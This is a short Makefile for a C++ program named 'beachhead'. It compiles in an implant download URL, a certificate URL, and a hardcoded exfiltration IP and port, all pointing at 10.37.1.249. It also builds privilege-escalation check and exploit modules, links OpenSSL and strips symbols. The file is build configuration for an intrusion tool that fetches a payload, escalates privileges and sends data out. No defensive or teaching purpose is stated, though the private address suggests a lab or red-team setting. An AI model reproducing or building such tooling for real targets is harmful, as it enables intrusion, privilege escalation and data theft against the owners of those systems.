URL ?= http://10.37.1.249/implant
CERT_URL = http://10.37.1.249/cert.pem

CXX = g++
CXXFLAGS = -std=c++20 \
           -O2 -s \
           -DURL='"$(URL)"' \
           -DCERT_URL='"$(CERT_URL)"' \
           -DEXFIL_IP='"10.37.1.249"' \
           -DEXFIL_PORT=8889
LDFLAGS = -lssl -lcrypto

TARGET = beachhead
SRC = beachhead.cpp privesc_check.cpp privesc.cpp privesc_check.h privesc.h

all: $(TARGET)

$(TARGET): $(SRC)
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRC) $(LDFLAGS)

clean:
	rm -f $(TARGET)
